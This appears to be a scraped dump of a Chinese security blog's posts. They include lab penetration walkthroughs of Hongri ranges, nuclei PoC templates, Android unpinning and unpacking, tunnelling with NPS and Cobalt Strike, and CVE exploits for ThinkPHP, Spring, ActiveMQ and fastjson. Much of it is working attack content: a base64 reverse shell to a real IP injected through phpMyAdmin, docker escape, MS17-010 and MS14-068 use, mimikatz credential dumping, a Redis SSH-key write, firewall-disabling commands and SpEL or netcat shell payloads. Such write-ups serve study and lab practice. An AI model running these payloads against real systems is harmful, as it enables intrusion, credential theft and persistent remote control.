/1.jsp/ HTTP/1.1\rHost: 192.168.3.103:8080\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\rReferer: http://192.168.3.103:8080/examples/\rAccept-Encoding: gzip, deflate\rAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2\rCookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94\rConnection: close\rContent-Length: 26\r\u0026lt;% out.println(\u0026#34;hello\u0026#34;);%\u0026gt; NMAP扫描 这里我们写入哥斯拉的shell连接\nNMAP扫描 2003端口 # NMAP扫描 里面右下角有admin版本4.8.1\nPOC利用\nphpmyadmin 4.8.1 远程文件包含漏洞 利用\rhttp://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../\retc/passwd\r我们可以包含\r执行 SELECT \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; 时，PHP 会把查询结果（即字符串 \u0026lt;?php phpinfo();?\u0026gt; ）通过 Session 机制存储（比如写入 $_SESSION 或直接落地到 Session 文件）。\r---Session 的本质是 “服务器存储用户数据的容器”，并非只能存 “登录信息” 。--\rselect \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; 这个session\r旧版本：sess_ + session_id\r新版本：可能直接用 session_id，但历史场景中大量存在 sess_ 前缀的习惯。\r通常在/tmp\rhttp://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../\rtmp/sess_6dd19ff2088d22ac4b1bfb67db1a68a5\rselect \u0026#39;\u0026lt;?php system(base64_decode(\u0026#34;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzIuNjQvODA4MCAwPiYxIg==\u0026#34;)) ?\u0026gt;\u0026#39; 反弹 看下session\nNMAP扫描 NMAP扫描 反弹shell\nNMAP扫描 docker提权 # tomcatshell里面发现了是在docker环境\nNMAP扫描 并且是特权 我们可以使用挂载逃逸\r把/dev/sda1 挂载过去 建立文件夹 niko下面\r写入公钥到root里面\r登录试试\r这里仅仅限制tomcat docker提权 其余两个shell没找到提权方法 NMAP扫描 这里我也试了定时任务但是就是不行\nNMAP扫描 并且可以看到确定是写入进去了的\nNMAP扫描 最后还是密钥登录拿到web全部权限\nNMAP扫描 内网渗透 # 启动我们的CS上线下第一台linux shell 这里用插件linux上线\rgenCrossC2.Linux ip tcp ./.cobaltstrike.beacon_keys null Linux x64 3.out NMAP扫描 生成开一个python3 对面用wget下载执行上线\nNMAP扫描 成功上线web\nNMAP扫描 发现另外一张网卡183 我们可以扫描下\nNMAP扫描 fsCAN扫描结果\nNMAP扫描 这里我用CS建立linux隧道没有成功换一个C2工具\nNMAP扫描 本地可以访问内网了使用ms17010扫描\nNMAP扫描 然后用msfconsle代理下socks扫描\nuse auxiliary/scanner/smb/smb_ms17_010\rset rhost 192.168.183.129\rsetg Proxies socks5:116.62.32.64:36666 NMAP扫描 拿下了win7\nNMAP扫描 使用mimikatz抓取密码开启3389登录上去\nNMAP扫描 然后使用MS14-068 注入但是我这里不知道为什么一直不成功\r命令如下生成后注入进去\r这里修改管理员密码\rnet user administrator Admin12345 net user administrator Admin12345 /active:yes 后激活rdp\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 打开3389 登录使用ms14-068\ncd \\Users\\douser\\Desktop\rMS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123\rmimikatz.exe\rkerberos::purge 清空\rkerberos::list\rkerberos::ptc TGT_douser@DEMO.com.ccache\rdir \\\\WIN-ENS2VR5TR3N\\C$\r然后可以访问DC C盘\r我这里能是建立了连接net use 如果你成功了注入了可以直接执行 下一步就是有了最高权限就是关闭防火墙这时候能用ms17010打DC了 NMAP扫描 ","date":"8 August 2025","externalUrl":null,"permalink":"/posts/red4/","section":"Posts","summary":"","title":"红日靶场4","type":"posts"},{"content":"","date":"6 August 2025","externalUrl":null,"permalink":"/tags/nuclei/","section":"Tags","summary":"","title":"Nuclei","type":"tags"},{"content":" nuclei-POC编写 # CVE介绍 # https://docs.nuclei.sh/template-guide/introduction https://blog.csdn.net/qq_41315957/article/details/126594572 https://blog.csdn.net/qq_41315957/article/details/126594670\nvulhub-启动CVE-2023-28432\nhttps://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md\n集群启动后，访问http://your-ip:9001可以查看Web管理页面，访问http://your-ip:9000是API服务。\n正常POC\nPOST /minio/bootstrap/v1/verify HTTP/1.1\rHost: your-ip:9000\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en-US;q=0.9,en;q=0.8\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\rConnection: close\rCache-Control: max-age=0\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 0\r会得到两个key\r放入即可利用 下载完开启是自动开启的服务，你不使用可以手动控制关闭\n123 123 手动编写httppoc # copy一个官方的按照格式进行修改\r这里修改下id 注意这个serverity等级不要乱改 改了会报错就medium high 等固定格式的进行修改 123 nuclei.exe -t mini.yaml -validate 123 id: CVE-2023-28432-minio\rinfo:\rname: starrui777\rauthor: starrui777\rseverity: high\rtags: cnvd,cnvd2017,emobile,ognl,fanwei\rhttp:\r- raw:\r- |\rPOST /minio/bootstrap/v1/verify HTTP/1.1\rHost: {{Hostname}}\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en-US;q=0.9,en;q=0.8\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36\rConnection: close\rCache-Control: max-age=0\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 0\rmatchers:\r- type: word\rpart: body\rwords:\r- \u0026#39;MINIO_ROOT_PASSWORD\u0026#39;\r- \u0026#39;MINIO_ROOT_USER\u0026#39;\rcondition: and\r基础解释：\rhttp: 表示http请求 {{Hostname}} 表示获取你输入的IP加端口\rraw 格式:完全模拟真实的 HTTP 报文，Nuclei 会原样发送请求，避免了因 YAML 语法转换可能导致的格式问题（比如 headers 缩进、特殊字符处理等）。\rmatchers: 表示匹配 word:返回词 包含两个 condition and表示两个都有表示漏洞验证成功否则失败\r还有很多见链接 这种什么缩进啊单词啊错误一个就识别不了可以使用validata识别或者AI问下但是AI大概率不行 123 手动编写-DNSLOGPOC # 首先DNSlog地址可长可短\rContent-Length: 165 这里就是确定不了数据包 你可以把\r​ Connection: close\r​ Content-Length: 165\r删除 可能删除 Content-Length，服务器可能无法正确判断请求体的结束位置\r它自带有dns不要直接放去 poc\rid: CVE-2022-30525\rinfo:\rname: starrui777\rauthor: starrui777\rseverity: high\rtags: cnvd,cnvd2017,emobile,ognl,fanwei\rhttp:\r- raw:\r- |\rPOST /ztp/cgi-bin/handler HTTP/1.1\rHost: {{Hostname}}\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\rContent-Type: application/json\rConnection: close\rContent-Length: 165\r{\u0026#34;command\u0026#34;: \u0026#34;setWanPortSt\u0026#34;,\u0026#34;proto\u0026#34;: \u0026#34;dhcp\u0026#34;,\u0026#34;port\u0026#34;: \u0026#34;1270\u0026#34;,\u0026#34;vlan_tagged\u0026#34;: \u0026#34;1270\u0026#34;,\u0026#34;vlanid\u0026#34;: \u0026#34;1270\u0026#34;,\u0026#34;mtu\u0026#34;: \u0026#34;{{payload1}}\u0026#34;,\u0026#34;data\u0026#34;:\u0026#34;\u0026#34;}\rpayloads:\rpayload1:\r- \u0026#34;; ping -c 3 {{interactsh-url}};\u0026#34;\rmatchers:\r- type: word\rpart: interactsh_protocol\rname: dns\rwords:\r- \u0026#34;dns\u0026#34;\r这里我用nuclei 2版本可以用nuclei3不行可能语法有变动 123 BP插件直接生成 # nuclei-burp-plugin-1.1.3\n常规的HTTP编写 dns的不行\n抓包记得修改端口\n123 选择响应匹配词发送到插件\n123 可以插件里面执行也可以保存下来\n123 自己验证\n123 ","date":"6 August 2025","externalUrl":null,"permalink":"/posts/nuclei-poc/","section":"Posts","summary":"","title":"nuclei-POC编写","type":"posts"},{"content":"","date":"4 August 2025","externalUrl":null,"permalink":"/tags/avws/","section":"Tags","summary":"","title":"AVWS","type":"tags"},{"content":" 自动化漏洞扫描工具-AVWS-POC管理工具-Nuclei-Tscanplus-Yscan # AVWS # 下载完开启是自动开启的服务，你不使用可以手动控制关闭\n123 登录后选择Target添加网址\n123 进入后默认选择扫描全部漏洞正常扫描\n123 如果你想BP看或者BP自动扫描可以转发数据包到BP联合\n123 选择扫描默认选择\n123 点进去查看信息\n123 选择扫描的漏洞提权发送包复制发送验证\n123 Tscanplus-集成工具 # 这个工具需要VIP看情况使用-附带指纹探测端口扫描等功能\n123 附带指纹识别很好用\n123 Yscan-集成工具 # 没有上面的VIP但是功能少点\n123 Nuclei-POC漏洞测试工具 # projectdiscovery/nuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities. 官方库\nhttps://github.com/ExpLangcn/NucleiTP https://github.com/wooluo/nuclei-templates-2025hw\nnuclei.exe -h帮助 -up更新 -t选择模板不选默认 -target 目标网址\n123 Yakit # yakit不仅可以控制发包也可以扫描漏洞\n123 全自动工具GOBY # 但是因为红队版POC少 使用需要付费 扫描默认扫描端口和POC 只需要IP\n123 ","date":"4 August 2025","externalUrl":null,"permalink":"/posts/scan/","section":"Posts","summary":"","title":"自动化漏洞扫描工具","type":"posts"},{"content":" APP-脱壳 # 要用到frida\npip install frida\rpip install frida-tools\rpip install frida-dexdump 脱壳\rfrida模拟器版本要和本地的一致\r转发并启动Frida\radb forward tcp:27042 tcp:27042\r连接判断：frida-ps -U frida-ps -R 确定上传的和本地的一致\n123 发现可以同步查看证明无误\n123 获取下APP包名字发现有加固\n123 在模拟器中先启动APP然后输入命令获取class文件\n123 压缩后上传到模拟器中\n123 解压缩\n123 全选DEX修复\n123 修复后放到压缩包里面发到主机\n123 解压放入jadx反编译APP软件\n123 发现可以搜索了，没有脱壳全是prop开头这种后缀\n123 ","date":"2 August 2025","externalUrl":null,"permalink":"/posts/app3/","section":"Posts","summary":"","title":"APP脱壳","type":"posts"},{"content":"","date":"2 August 2025","externalUrl":null,"permalink":"/tags/cs/","section":"Tags","summary":"","title":"CS","type":"tags"},{"content":" 红日靶场1-CS内网渗透 # 架构 # IP：\n攻击者为1网段\nweb服务器：1和52网段 其余成员皆只有1网段\n123 使用工具 # 密码可能不同因为进去这些服务器就让你改密码你可以修改后改回来\n使用工具：\nCS4.7\n哥斯拉\nimpacket-0.11.0套件\n开始渗透 # 第一台主机 # 这里shell有两种还有一种是网站的还有一种是下面这种数据库\n123 dir扫描发现开了phpadmin登录看看\n123 弱口令进去\nroot:root 123 https://www.cnblogs.com/hellobao/articles/17253635.html\nphpadmin提取方法\r我选择下面这种\rMySQL 本身具备的特性\r通过日志文件写 shell\rSHOW VARIABLES LIKE \u0026#39;general%\u0026#39;;\rset global general_log = \u0026#34;ON\u0026#34;;\rset global general_log_file=\u0026#39;C:\\\\phpstudy\\\\www\\\\\\\\star.php\u0026#39;\r因为他这是phpstudy所以写入日志到star.php 打开功能\n123 命令执行无误\n123 确实可以访问\n123 写入到日志\n123 哥斯拉连接\n123 弹到我们的CS工具上\n123 扫描端口网段\n123 自动放入到密码和目标里面\n123 找到CD主机\n123 123 123 第二台主机 # 因为前面信息收集到都开放了445 我们尝试下永恒之蓝和wmi\n123 不行啊两台都\n123 使用套件里面的wmi成功拿下DC\npython wmiexec.py Administrator:hongrisec@2025@192.168.52.138 -codec gbk 123 这里我试了反弹但是就是不行正向都不行\n123 最后关闭防火墙可以连接\n#关闭防火墙\rnetsh firewall set opmode disable #winsows server 2003 之前\rnetsh advfirewall set allprofiles state off #winsows server 2003 之后\r#注册表开启3389端口\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r#添加防火墙规则\rnetsh advfirewall firewall add rule name=\u0026#34;Open 3389\u0026#34; dir=in action=allow protocol=TCP localport=3389 123 第三台主机 # 在密码凭证那里\n后面我们横向连接密码喷射上到第3台\n123 三台全部拿下\n123 ","date":"31 July 2025","externalUrl":null,"permalink":"/posts/red1/","section":"Posts","summary":"","title":"红日靶场1-CS内网渗透","type":"posts"},{"content":"","date":"29 July 2025","externalUrl":null,"permalink":"/tags/ms-17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dsmb/","section":"Tags","summary":"","title":"Ms-17-010永恒之蓝smb","type":"tags"},{"content":"","date":"29 July 2025","externalUrl":null,"permalink":"/tags/vshell/","section":"Tags","summary":"","title":"Vshell","type":"tags"},{"content":"","date":"29 July 2025","externalUrl":null,"permalink":"/tags/%E5%86%85%E7%BD%91/","section":"Tags","summary":"","title":"内网","type":"tags"},{"content":" 红日靶场7-WP-MS17-010-WMI-laravel-docker-exp # 架构如下记得关闭win7防火墙\n123 工具\nfscan\nCVE-2021-3129.py\nredis-cli or Another Redis Desktop Manager\nC2平台用于socks代理\nlinux内核提权C脚本 CVE-2021-3493/exploit.c at main · briskets/CVE-2021-3493\nProxifier代理\nmimikatz 密码\nimpacket-0.11.0-wmiexec 工具\n方程式工具包图形界面版V0.42\n第一台主机 # 使用FSCAN扫描是laravel框架使用CVE\n123 123 拿下一个后门\n同时他这里扫描还有一个redis我们试试未授权发现可以写入我们的公钥进去 直接SSH访问拿下第一台主机shell\n这里set read-only no是让他可写\nconfig set dir /root/.ssh/\rconfig set dbfilename authorized_keys\r# 保存key的时候加上两个`\\n`是为了避免和Redis里其他缓存数据混合\rconfig set slave-read-only no\rset key \u0026#34;\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChJ31EeTjZIw5tz/8b2Ma6XyrjI6+FSUfbnWRF7HA6/pMtgTbZGPhKXRzdigHq2NY40KSz7xpeDvpZEbdCjpCiimXfwgALaZpI/GxftyA4C9yWoSQxR7jdK8dWAurA9rnoPnwrOO8F14rg2P2vknrtR70eIklAwbuDvJ8Aq9Ai5tMPaiOx2uJAYRWYRgOd/jP4WhZ8nF88N+E963xFf/Bf37AMV4SVujvasubsmM96t7fOqEBgzyK+xTClVqhzzGKhcr5AfYDvemDnffXEC3Ff+cdkXpW8HhX8FrK6D2HzwpOIN/8hypJNkGssXOZ9E4rTWWoY84VtPvceYMUI7xV44VskmZMLYrBAxfPDzEJV/HHKX1xQXwsHg7WiSRntApPS3BfeMr8ZqJTSBqoTVAnoMAuClPy1Vm1c+mlzvjlCbBBLfLEWNvuslzR9rQMFpMwLN3PoBhyGZ5+gv94QPbicLhNuLdU10KD5dHLtWUoWIGOu2RqtcjjKul+fT62BPy8= root@kali\\n\\n\u0026#34;\rsave 123 登录成功\n123 可以看它使用了nginx代理了内网的52.20的8000端口也就是说这个端口有这个服务\n123 我们把上面那个shell弹过来因为是内网可以弹\n123 可以发现我们是在docker中\n123 这里root有一个权限\n123 经典环境变量劫持提权\n123 123 第二台主机 # 挂载逃逸\n123 可以发现我们现在的目录就是在docker外这是源自于他设置docker设置了我们可以挂载并且修改后同步到上面不然不行\n123 我们写入公钥到ubuntu用户\n123 123 123 支持拿下两台主机\n123 linux内核提权\n123 第三台主机-OAweb2 # 我们在主机二上面放fscan\n发现了内网有一个OA系统\n123 我们在第一台DMZ主机加socks这里C2平台你用MSF CS都可以\n123 windows使用Proxifier代理\n123 123 访问时候代理触发证明配置正确\n123 使用OA工具扫描获得一个SHELL\n123 蚁剑连接\n123 放入后门我们连接\n123 我们正向socks连接获得三台主机权限\n123 第四台主机 # 这里我环境很多问题IP第一台变了181变了184\n我们上传mimikatz用户黄金票据扫描密码\n123 mimikatz.x64.exe \u0026#34;sekurlsa::logonpasswords full\u0026#34; exit \u0026gt; password.txt 123 123 这里我们在windows上面加一个socks代理 创建一个socks池用户全面穿透内网到达92网段\n123 使用wmiexec协议获取DC\n123 远程下载OA上面的8067后门我们可以主动连接\n123 拿下第四台\n123 第五台 # FSCAN扫描\n123 发现了永恒之蓝\n123 工具\n123 123 123 远程下载后门正面连接拿下第五台\n123 关闭防火墙\rnet use \\\\192.168.93.30\\ipc$ \u0026#34;Whoami2021\u0026#34; /user:\u0026#34;Administrator\u0026#34;\rsc \\\\192.168.93.30 create unablefirewall binpath= \u0026#34;netsh advfirewall set allprofiles state off\u0026#34;\rsc \\\\192.168.93.30 start unablefirewall ","date":"29 July 2025","externalUrl":null,"permalink":"/posts/red7/","section":"Posts","summary":"","title":"红日靶场7-WP-MS17-010-WMI-laravel-docker-exp","type":"posts"},{"content":" APP-动态调试 # 打开开发者模式\n123 允许USB调试\n123 使用JEB-5.9.0.202402071731_by_CXV工具 使用JDK17或者你环境\n123 反编译要调试的软件加上这串代码\nandroid:debuggable=\u0026#34;true\u0026#34; 123 拿出设置好的APP\n123 测试adb正常不\n123 使用软件自动反编译右键可以转换为JAVA代码 CTRL+B设置断点\n123 完成这个验证\n123 断点点开调试\n123 右边数据就是我们的验证\n123 123 ","date":"26 July 2025","externalUrl":null,"permalink":"/posts/anly/","section":"Posts","summary":"","title":"APP动态调试","type":"posts"},{"content":" CS怎么上线LINUX # 实现目标-上线linux # 这里我用公网当服务器开一个teamserver服务密码对应./teamserver ip 密码\n这里要用插件CrossC2-GithubBot-2023-11-20.cna\ngenCrossC2.Linux 复制到客户端 这里我用windows启动但是我生成脚本是在kali因为我公网生成报错\n很关键一部是把服务器端的.cobaltstrike.beacon_keys 文件复制到客户端然后利用插件genCrossC2.Linux生成\n123 测试没有那个.cobaltstrike.beacon_keys 文件 一直卡不出来，放上去就生成运行CS就上线了有MAC的换就行了\n123 ","date":"26 July 2025","externalUrl":null,"permalink":"/posts/cs/","section":"Posts","summary":"","title":"CS怎么上线LINUX","type":"posts"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/tags/app/","section":"Tags","summary":"","title":"App","type":"tags"},{"content":" APP-逆向修改 # 实现目标-修改文本的值 # 这里使用NP管理器可以直接逆向修改自动编译非常方便或者MT管理都可以，可以使用jadx-gui 查看原始JAVA代码，这里代码是smali代码\ntest 修改下面的文字\ntest 直接右上角搜索发现文本修改\ntest 修改保存退出\ntest 重新自动安装发现变了\ntest 下面那个文字不知道怎么搜就用这个开发者助手点击分析\ntest 直接复制搜索然后一套流程\ntest 修改保存重新安装\ntest 如下\ntest 修改图片类似但是怎么搜索可以到assets目录或者res目录里面有静态图片资源然后覆盖就行\ntest test 关于修改逻辑这里把逻辑代码直接改为smali语法的ip-nez与原本的等于改为不等于\n或者你修改VIP本身的函数把0x0修改为0x1绕过验证\ntest test 绕过广告可以使用这个算法助手加上LSPosed直接选择修改\ntest 进去三秒没有弹广告\ntest 有的APP绕过广告\n去掉取反 一直为真则跳过\ntest ","date":"25 July 2025","externalUrl":null,"permalink":"/posts/apptest3/","section":"Posts","summary":"","title":"APP-逆向修改","type":"posts"},{"content":" APP-安卓9模拟器抓包设置-绕过双向验证-自动扫描工具推荐 # 实现系统证书安装 # 我们先看看用户证书怎么装的\n使用模拟器-逍遥安卓9版本 这版本用户模式不能抓包了必须系统证书才可以\radb工具platform-tools_r34.0.4-windows\r使用 frida frida-server-17.2.12-android-x86_64 必须对应本地和模拟器一致 BP开启端口8888\ntest pip list 检查版本下载对应的frida上传到模拟器\radb.exe push frida-server-17.2.12-android-x86_64 /data/local test 上传后给 chmod +x frixx 执行\r本机frida-ps -U 看看能否接收 test 模拟器关闭所有\rfrida -U -f ddns.android.vuls -l SSLUnpinning.js 执行脚本\r发现可以执行 并且成功抓包绕过证书验证 test 某tantanAPP和wzyd这样绕过 和那个面具+模块差不多的 这个更直接简单FRIDA更直观\n资产收集工具：\napkleaks 好东西啊 扫描URL 端口 链接 $ pip3 install apkleaks 安装\npip3 install apkleaks 自动提取 test mobsf\nAppMessenger\n","date":"22 July 2025","externalUrl":null,"permalink":"/posts/apptest2/","section":"Posts","summary":"","title":"APP-安卓9模拟器抓包设置-绕过双向验证","type":"posts"},{"content":" APP-安卓9模拟器抓包设置-安装系统BP证书 # 实现系统证书安装 # 我们先看看用户证书怎么装的\n使用模拟器-逍遥安卓9版本 这版本用户模式不能抓包了必须系统证书才可以\radb工具platform-tools_r34.0.4-windows BP开启端口8888\ntest 模拟器登录网站下载证书命名为cer\ntest 安装取名字\ntest 这里我们在设置-\u0026gt;信任用户证书查看安装成功 - 用户证书\ntest 安装系统证书 # 设置独立系统盘-\u0026gt;在引擎里面开启Root模式\ntest windows没有openssl就用linux kali自带的 下载后输入命令就行 另存为.pem保存文件为9a5ba575.0\rOpenSSL 是一个开源的软件库，提供了安全套接字层（SSL）和传输层安全性（TLS）协议的实现，以及各种密码学算法，被广泛用于互联网上的安全通信\ropenssl x509 -inform DER -in cacert.der -out cacert.pem 将证书从 DER 二进制格式 转换为 PEM 文本格式。\ropenssl x509 -inform PEM -subject_hash_old -in cacert.pem 计算 PEM 格式证书的 旧版主题哈希值（Subject Hash），并输出该哈希值。 test 放到工具里adb打开\radb.exe root\radb.exe devices\radb.exe push 9a5ba575.0 /sdcard/ adb.exe shell\rmount -o rw,remount / 修改权限 mount作用把/dev挂载到盘里因为dev不提供文件浏览必须先挂载\rmount -o rw,remount /system\rchmod 777 /system\rmount -o remount -o rw /\rcp /sdcard/9a5ba575.0 /system/etc/security/cacerts/\rchmod 644 /system/etc/security/cacerts/9a5ba575.0\rreboot test 安装成功\ntest 抓包测试 # 有的配置了就可以抓包\n有的做了限制你还是抓不到\n设置走代理\ntest 测试成功但是做了SSL证书限制的你还是抓不到\ntest 有的设置了反代理-反模拟器-证书校验\n反代理-他验证可能检测的是你设置开了没有代理-你用APP代理就行不打开代理设置\n工具 ProxyPin-android-缺点不能转到BURP只能看抓包不能修改\n工具 Postern-3.1.2 转发BURP抓包\n绕过反代理 # test test 成功抓包绕过反代理\ntest 或者把模拟器走proxifier转发 把模拟器.exe走burp的127.0.0.1:8888端口转发到BP绕过模拟器因为真机比模拟器高一个等级\n如果都不行 反编译删除检测代码\n反证书：\nMagisk+LSPosed 两个组合绕过模块 通过共享上传LSPosed ZIP文件\ntest 然后删除/system/xbin/su这个文件防止面具报错\t用文件管理器打开超级管理员\n删除不掉没关系打开不提示就行\ntest 设置一下\ntest 重启后在wifi那里启动代理\ntest 成功抓包不会崩溃-如果模块没有装备的话进去直接会网络崩溃-记得用wifi代理\ntest ","date":"21 July 2025","externalUrl":null,"permalink":"/posts/apptest/","section":"Posts","summary":"","title":"APP-安卓9模拟器抓包设置-安装系统BP证书","type":"posts"},{"content":"","date":"20 July 2025","externalUrl":null,"permalink":"/tags/nps/","section":"Tags","summary":"","title":"Nps","type":"tags"},{"content":" NPS-内网攻防信息打点工具 # 实现目标-通过本机访问别人的localhost3306数据库 # test 本地启动nps服务端 默认打开8080端口web服务 账号admin密码123 可以在conf里面修改密码\ntest 登录后创建一个客户端复制连接口令\ntest 把下面命令复制给客户端的一台跳板主机\ntest test 运行刷新连接变成了就绪我们点击隧道创建一个本地的6666就是对应对方IP的3306 对应数据库服务\ntest 访问查看发现可以直接连接\ntest 后续使用Socket建立一个节点也可以\n实现目标通过socks建立节点打通内网 # 先安装代理工具linux\n# Debian/Ubuntu sudo apt-get install proxychains # CentOS/RHEL sudo yum install proxychains-ng 如果是windows 用proxfier 这里nps用的socks5 使用 # 注释掉原有示例，添加你的代理 /etc/proxychains.conf 文件 设置 socks5 127.0.0.1 1080 # SOCKS5 代理 # http 127.0.0.1 8080 # HTTP 代理（根据需要选择） 设置通过socks本身9999端口\ntest NPS设置界面为9999和本地吻合\ntest 使用proxychains4 curl xx 代理来运行 不要直接运行\r可以看到成功访问我们的内网 上面是没用的访问不到 test nps改默认密码\n修改 nps.conf 文件把默认密码123修改即可\n实现通过VSHELL平台设置端口映射 # 基于端口转发技术挂载在公网\n实现隐藏真实IP只有转发服务器IP test 把8084转发到内网的8084干到了公网上\ntest test ","date":"20 July 2025","externalUrl":null,"permalink":"/posts/nps/","section":"Posts","summary":"","title":"NPS-内网攻防信息打点工具","type":"posts"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/activemq/","section":"Tags","summary":"","title":"ActiveMQ","type":"tags"},{"content":" 处理平台安全-ActiveMQ-RocketMQ-Kafka-CVE # ActiveMQ # 界面如下，通常通过端口 8161 web 61616 tcp远程访问 来判断或者通过功能点来判断\ntest CVE-2022-41678 # 在5.16.5, 5.17.3版本及以前 python poc.py -u admin -p admin http://xx:8161/\ntest 2、CVE-2023-46604 # python3 -m http.server 6666 python3 poc.py 目标IP 目标端口 http://IP:6666/poc.xml python \u0026ldquo;poc (1).py\u0026rdquo; 192.168.79.136 61616 http://xx:8000/poc.xml\n通过建立网络\ntest POC具体内容\ntest RocketMQ # 9876 NameServer通信端口用于客户端路由请求和Broker注册发现 10911 Broker主监听端口处理消息发送/消费等核心服务\n搭建很麻烦遇到直接测试\n探测：d:\\Python3.8\\python.exe check.py \u0026ndash;ip ip \u0026ndash;port 9876\nCVE-2023-33246 CVE-2023-37582\nPOC java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker \u0026ndash;target ip:10911 \u0026ndash;cmd \u0026ldquo;xxxx\u0026rdquo;\nPOC python.exe CVE-2023-37582.py -ip ip -p 9876\nKafka # 分布式流处理平台，用于高吞吐量实时数据传输存储和处理， 广泛应用于日志收集、消息队列、数据管道、实时分析等场景。\nCVE-2023-25194 漏洞影响版本：2.3.0 \u0026lt;= Apache Kafka \u0026lt;= 3.3.2 https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.md 需要JNDI 字节码搭建攻击\ntest ","date":"18 July 2025","externalUrl":null,"permalink":"/posts/active/","section":"Posts","summary":"","title":"ActiveMQ-RocketMQ-Kafka-CVE","type":"posts"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/kafka/","section":"Tags","summary":"","title":"Kafka","type":"tags"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/rocketmq/","section":"Tags","summary":"","title":"RocketMQ","type":"tags"},{"content":"","date":"17 July 2025","externalUrl":null,"permalink":"/tags/springboot/","section":"Tags","summary":"","title":"SpringBoot","type":"tags"},{"content":"","date":"17 July 2025","externalUrl":null,"permalink":"/tags/struct2/","section":"Tags","summary":"","title":"Struct2","type":"tags"},{"content":"","date":"17 July 2025","externalUrl":null,"permalink":"/tags/thinkphp/","section":"Tags","summary":"","title":"THINKPHP","type":"tags"},{"content":" THINKPHP-laravel-SpringBoot-Gateway-Struct2 CVE # thinkphp # thinkphp\n在其6.0.13版本及以前\n/?+config-create+/\u0026amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;/\u0026lt;?=phpinfo()?\u0026gt;+shell.php\r写入文件 test 版本5.X命令执行 工具梭哈\ntest test Laravel # CVE-2021-3129 RCE 工具 # exp python\nstruct2框架 16年很多现在很少了 # 特点 index.action 这个action 工具梭哈因为漏洞很多\ntest SpringBoot # CVE-2022-22965 # Spring core是Spring系列产品中用来负责发现、创建并处理bean之间的关系的一个工具包，是一个包含Spring框架基本的核心工具包，Spring其他组件都要使用到这个包。\nCVE-2022-22965_Spring_Core_RCE-main\u0026gt; exp.py\ntest CVE-2021-21234 目录遍历 # Spring-boot-actuator-logview 0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。 需要有这个组件才可以 而且要满足版本 不然不行\ntest CVE-2022-22947 # API网关Spring Cloud Gateway是Spring中的一个API网关。 Spring Cloud Gateway 3.1.x \u0026lt; 3.1.1 Spring Cloud Gateway 3.0.x \u0026lt; 3.0.7\n两种工具直接梭哈\ntest test CVE-2022-22963 Spring Cloud Function Spel表达式注入 # Spring Cloud Function提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像Amazon AWS Lambda这样的 FaaS（函数即服务，function as a service）平台。\n3.0.0.RELEASE \u0026lt;= Spring Cloud Function \u0026lt;= 3.2.2 参考：https://developer.aliyun.com/article/1160011\nPOST：/functionRouter\rspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,xx}|{base64,-d}|{bash,-i}\u0026#34;) test ","date":"17 July 2025","externalUrl":null,"permalink":"/posts/tp-lara-springboot/","section":"Posts","summary":"","title":"THINKPHP-laravel-SpringBoot-Gateway-Struct2 CVE","type":"posts"},{"content":" fastjson-不出网-限制 # JDK版本高 # 用jndibypass工具自动验证 JDK版本高的问题 打入payload\n使用fjparty靶场\ntest test test FASTJSON遇到WAF限制 # 输入提示hack 这个只能一个PAYLOAD一个打尝试因为不知道版本\nnc ip tcp -e sh\ntest 使用unicode编码绕过\ntest 不出网 # 判断依赖\n{\u0026#34;x\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Character\u0026#34;{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;com.mchange.v2.c3p0.DataSources\u0026#34;}} {\r\u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;\r} test test 注入原生fastjson 1.2.47代码执行命令\ntest 